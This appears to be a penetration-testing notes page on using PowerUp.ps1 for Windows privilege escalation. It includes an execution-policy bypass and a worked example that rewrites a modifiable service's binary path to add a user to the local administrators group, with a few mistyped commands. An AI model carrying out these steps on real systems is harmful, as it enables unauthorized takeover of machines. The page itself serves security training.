# PowerUP.ps1

PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" %}



Import the library into PowerShell session.

```powershell
powershell -ep bypass
. .\PowerUP.ps1
Invoke-AllChecks-Verbose
```

Do all check of PowerUP:

```powershell
Invoke-AllChecks
```



## Modifiable Service PrivEsc

List services which can be configured:

```powershell
Get-ModifiableService -Verbose
```

If we found one of these, we can change the BINARY\_PATH\_NAME to execute a arbitrary command. For example a command to change the admin group members.

<figure><img src="../../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Check if the service found is set to AUTO\_START&#x20;

```powershell
sc.exe qc snmptrap
```

<figure><img src="../../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Then, verifying that we can set the command to execute.

```powershell
sc.exe config snmptrap binpath="net localgroup administrators DOMAIN\employee /add"
```

Check if the modify was  sucessful

```powershell
sc.exe qc snmptrap
```

Now when we restart the service, the command will be execute and we will have the administrator privilege.

```powershell
Restart-Services snmptrap
```

{% hint style="info" %}
Make a Logoff from the machine to reset the privilege and to have the administrator privilege
{% endhint %}



Unquoted Service Path:

```powershell
Get-ServiceUnquoted -Verbose
```
